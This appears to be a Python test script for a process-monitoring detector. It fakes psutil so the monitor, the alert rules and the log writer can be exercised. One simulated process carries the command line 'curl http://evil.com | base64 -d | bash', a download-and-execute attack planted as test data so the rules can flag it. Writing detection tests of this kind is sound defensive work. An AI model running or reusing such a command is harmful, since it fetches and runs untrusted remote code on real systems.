"""Simulated test run that fakes `psutil` so we can exercise the monitor/rules/logger
without installing external packages. Writes test logs to `logs/test_*.jsonl`.
"""
import sys
import os
from pathlib import Path

# Add parent directory to path so we can import monitor, rules, logger
sys.path.insert(0, str(Path(__file__).parent.parent))

import types
from types import SimpleNamespace

# Create a fake psutil module and insert into sys.modules before importing monitor
psutil = types.ModuleType("psutil")


class NoSuchProcess(Exception):
    pass


class AccessDenied(Exception):
    pass


psutil.NoSuchProcess = NoSuchProcess
psutil.AccessDenied = AccessDenied


def process_iter(attrs=None):
    # On first call return two processes; subsequent calls return the same set.
    calls = getattr(psutil, "_calls", 0)
    psutil._calls = calls + 1
    procs = [
        SimpleNamespace(info={
            "pid": 1001,
            "name": "good",
            "exe": "/usr/bin/good",
            "cmdline": ["/usr/bin/good"],
            "create_time": 0,
            "username": "tester",
        }),
        SimpleNamespace(info={
            "pid": 1002,
            "name": "bash",
            "exe": "/bin/bash",
            "cmdline": ["bash", "-c", "curl http://evil.com | base64 -d | bash"],
            "create_time": 0,
            "username": "tester",
        }),
    ]
    for p in procs:
        yield p


psutil.process_iter = process_iter

sys.modules["psutil"] = psutil


from monitor import ProcessMonitor
from rules import find_suspicious
from logger import write_jsonl
from datetime import datetime, timezone
import socket


def _utc_now_iso_z() -> str:
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def make_event_dict(proc_info: dict) -> dict:
    e = proc_info.copy()
    e.setdefault("first_seen", _utc_now_iso_z())
    e["host"] = socket.gethostname()
    return e


def run_test():
    m = ProcessMonitor()
    # first scan should return two new processes
    first = m.scan()
    print("first scan count:", len(first))
    for p in first:
        event = make_event_dict(p)
        write_jsonl("logs/test_process_events.jsonl", event)
        texts = [p.get("name") or "", p.get("exe") or "", p.get("cmdline") or ""]
        result = find_suspicious(texts)
        if result["matches"]:
            # Format matches for logging
            match_list = [f"{pattern}({score})" for pattern, score in result["matches"]]
            alert = {
                "pid": p.get("pid"),
                "severity": result["severity"],
                "risk_score": result["total_score"],
                "matches": match_list,
                "event": event,
                "timestamp": _utc_now_iso_z(),
            }
            write_jsonl("logs/test_alerts.jsonl", alert)
            print(f"[{result['severity']}] pid={alert['pid']} score={result['total_score']} matches={match_list}")

    # second scan should return 0 new processes (same PIDs)
    second = m.scan()
    print("second scan count:", len(second))


if __name__ == "__main__":
    run_test()